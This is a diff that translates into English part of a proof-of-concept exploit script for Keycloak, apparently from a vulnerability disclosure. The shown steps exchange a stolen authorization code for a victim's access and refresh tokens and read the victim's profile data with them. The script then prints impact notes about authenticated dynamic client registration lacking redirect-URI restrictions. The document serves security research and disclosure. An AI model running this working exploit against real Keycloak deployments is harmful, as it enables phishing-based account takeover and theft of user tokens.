+    # STEP 7: Exchange auth code for victim tokens
     # ══════════════════════════════════════════════════════════════
-    langkah(7, "ATTACKER — Tukar auth code curian menjadi token victim")
+    step(7, "ATTACKER — Exchange stolen auth code for victim tokens")
 
     status, token_resp = http_post_form(kc_host, kc_port,
         f"/realms/{realm}/protocol/openid-connect/token",
@@ -702,56 +705,56 @@ def main():
          "redirect_uri": callback_url})
 
     if "access_token" not in token_resp:
-        gagal(f"Token exchange gagal: {token_resp}")
+        fail(f"Token exchange failed: {token_resp}")
         server.shutdown()
-        print_ringkasan(hasil)
+        print_summary(results)
         return 1
 
     claims = decode_jwt(token_resp["access_token"])
 
     print(f"""
   {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-  ║           TOKEN VICTIM BERHASIL DICURI!                      ║
+  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
   ╚══════════════════════════════════════════════════════════════╝{RESET}
 
     {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
     {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
-    {BOLD}Nama Lengkap:{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
+    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
     {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
     {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
     {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
     {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}
 
-  {YELLOW}{BOLD}Attacker sekarang punya akses penuh ke akun victim!{RESET}
+  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
 """)
-    hasil.append(("Token victim berhasil dicuri", True))
+    results.append(("Victim token stolen", True))
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 8: Verifikasi akses data victim
+    # STEP 8: Verify — access victim data
     # ══════════════════════════════════════════════════════════════
-    langkah(8, "ATTACKER — Verifikasi akses data victim dengan token curian")
+    step(8, "ATTACKER — Verify access to victim data with stolen token")
 
     status, userinfo = http_get_json(kc_host, kc_port,
         f"/realms/{realm}/protocol/openid-connect/userinfo",
         token_resp["access_token"])
 
     if status == 200:
-        sukses("Userinfo victim berhasil diakses:")
+        success("Victim userinfo accessed successfully:")
         for k, v in userinfo.items():
             if k not in ("sub",):
                 print(f"    {k}: {v}")
-        hasil.append(("Akses data victim terverifikasi", True))
+        results.append(("Victim data access verified", True))
     else:
-        peringatan(f"Userinfo gagal (HTTP {status})")
-        hasil.append(("Akses data victim terverifikasi", False))
+        warn(f"Userinfo failed (HTTP {status})")
+        results.append(("Victim data access verified", False))
 
     server.shutdown()
-    print_ringkasan(hasil)
+    print_summary(results)
     return 0
 
 
-def simulasi_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
-    """Simulasi victim login otomatis (untuk mode --auto-victim)."""
+def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
+    """Automatically simulate victim login (for --auto-victim mode)."""
     time.sleep(2)
 
     try:
@@ -837,40 +840,41 @@ def simulasi_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
 listen_port_global = 48888
 
 
-def print_ringkasan(hasil):
-    """Tampilkan ringkasan hasil tes."""
-    vuln_count = sum(1 for _, v in hasil if v)
+def print_summary(results):
+    """Display test results summary."""
+    vuln_count = sum(1 for _, v in results if v)
 
     print(f"""
 {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-║                    RINGKASAN HASIL                           ║
+║                    RESULTS SUMMARY                           ║
 ╚══════════════════════════════════════════════════════════════╝{RESET}
 """)
-    for nama, vuln in hasil:
-        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}AMAN{RESET}"
-        print(f"  {nama:45s} {status_str}")
+    for name, vuln in results:
+        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}SECURE{RESET}"
+        print(f"  {name:45s} {status_str}")
 
     print(f"""
-{YELLOW}Dampak Serangan:{RESET}
-  - User dengan role create-client bisa mencuri token user MANAPUN
-  - Victim melihat halaman login Keycloak yang 100% asli (domain trusted)
-  - Refresh token memberikan akses persisten ke akun victim
-  - Satu client jahat bisa phishing semua user di realm
+{YELLOW}Attack Impact:{RESET}
+  - User with create-client role can steal tokens of ANY realm user
+  - Victim sees 100% legitimate Keycloak login page (trusted domain)
+  - Stolen refresh token provides persistent access to victim account
+  - One malicious client can phish all users in the realm
 
 {YELLOW}Policy Gap:{RESET}
-  - Anonymous DCR   : Trusted Hosts DITERAPKAN (benar memblokir)
-  - Authenticated DCR: Trusted Hosts TIDAK ADA (membolehkan redirect apapun)
-  - Admin REST API  : Return 403 (benar memblokir)
+  - Anonymous DCR   : Trusted Hosts ENFORCED (correctly blocks)
+  - Authenticated DCR: Trusted Hosts NOT PRESENT (allows any redirect_uri)
+  - Admin REST API  : Returns 403 (correctly blocks)
 
-{YELLOW}Akar Masalah:{RESET}
-  Policy "Trusted Hosts" hanya ada di subType "anonymous".
-  SubType "authenticated" tidak punya validasi URI sama sekali.
+{YELLOW}Root Cause:{RESET}
+  The "Trusted Hosts" client registration policy only exists in the
+  "anonymous" subType. The "authenticated" subType has no URI
+  restriction policy whatsoever.
 """)
 
     if vuln_count > 0:
-        print(f"{RED}{BOLD}[!] KERENTANAN TERKONFIRMASI — {vuln_count}/{len(hasil)} tes positif{RESET}")
+        print(f"{RED}{BOLD}[!] VULNERABILITY CONFIRMED — {vuln_count}/{len(results)} tests positive{RESET}")
     else:
-        print(f"{GREEN}{BOLD}[+] Semua tes aman — tidak rentan{RESET}")
+        print(f"{GREEN}{BOLD}[+] All tests passed — not vulnerable{RESET}")
 
 
 if __name__ == "__main__":
@@ -883,4 +887,4 @@ if __name__ == "__main__":
 
 ---
 
-*Finding ini divalidasi pada 2026-02-21 terhadap instance Keycloak 26.5.4 baru di VPS privat milik peneliti. Tidak ada sistem produksi, data user nyata, atau infrastruktur pihak ketiga yang diakses.*
+*This finding was validated on 2026-02-21 against a fresh Keycloak 26.5.4 instance on the researcher's private VPS. No production systems, real user data, or third-party infrastructure was accessed.*
